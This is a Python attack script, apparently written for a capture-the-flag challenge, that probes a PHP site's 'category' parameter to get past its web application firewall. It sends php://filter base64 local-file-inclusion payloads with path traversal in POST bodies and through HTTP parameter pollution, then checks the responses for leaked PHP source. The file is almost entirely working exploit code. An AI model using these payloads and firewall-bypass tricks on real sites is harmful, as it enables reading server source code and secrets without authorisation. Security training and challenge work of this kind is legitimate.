"""Round 9: WAF bypass attempts - POST body, parameter pollution, encodings."""
import re
import urllib.request
import urllib.parse

ROOT = "http://noctf.fa1lsnow.com:40547/index.php"

POST_BODY = "category=" + urllib.parse.quote("php://filter/convert.base64-encode/resource=woofers/../flag", safe="")
GET_HPP = "/index.php?category=woofers/../flag&category=" + urllib.parse.quote(
    "php://filter/convert.base64-encode/resource=woofers/../flag", safe="")
GET_HPP2 = "/index.php?category=" + urllib.parse.quote(
    "php://filter/convert.base64-encode/resource=woofers/../flag", safe="") + "&category=woofers"


def show(label, req):
    try:
        with urllib.request.urlopen(req, timeout=8) as r:
            body = r.read().decode("utf-8", "replace")
            st = r.status
    except urllib.error.HTTPError as e:
        st, body = e.code, e.read().decode("utf-8", "replace")
    except Exception as e:  # noqa: BLE001
        st, body = "ERR", repr(e)
    note = ""
    if isinstance(body, str):
        m = re.search(r'<div class="page-include">(.*?)</div>', body, re.S)
        if m:
            note = re.sub(r"\s+", " ", m.group(1)).strip()[:600]
        if "Sorry" in body:
            note += " [SORRY]"
        if "PD9waHA" in body:
            note += " *** BASE64 PHP FOUND ***"
    print(f"[{st}] {label}\n      {note}\n")
    return body


# 1. POST body param
req = urllib.request.Request(ROOT, data=POST_BODY.encode(),
                             headers={"User-Agent": "probe", "Content-Type": "application/x-www-form-urlencoded"})
show("POST body category=php://filter...resource=woofers/../flag", req)

# 2. POST body, simple resource=flag
body2 = "category=" + urllib.parse.quote("php://filter/convert.base64-encode/resource=flag", safe="")
req = urllib.request.Request(ROOT, data=body2.encode(),
                             headers={"User-Agent": "probe", "Content-Type": "application/x-www-form-urlencoded"})
show("POST body category=php://filter...resource=flag", req)

# 3. HPP: woofers first, payload second (PHP takes last -> payload; if WAF checks first only -> pass)
show("GET HPP woofers-first", urllib.request.Request("http://noctf.fa1lsnow.com:40547" + GET_HPP, headers={"User-Agent": "probe"}))

# 4. HPP: payload first, woofers second (PHP takes last -> woofers; control)
show("GET HPP payload-first", urllib.request.Request("http://noctf.fa1lsnow.com:40547" + GET_HPP2, headers={"User-Agent": "probe"}))

# 5. POST with woofers in query + payload in body
req = urllib.request.Request("http://noctf.fa1lsnow.com:40547/index.php?category=woofers", data=POST_BODY.encode(),
                             headers={"User-Agent": "probe", "Content-Type": "application/x-www-form-urlencoded"})
show("POST body payload + query woofers", req)
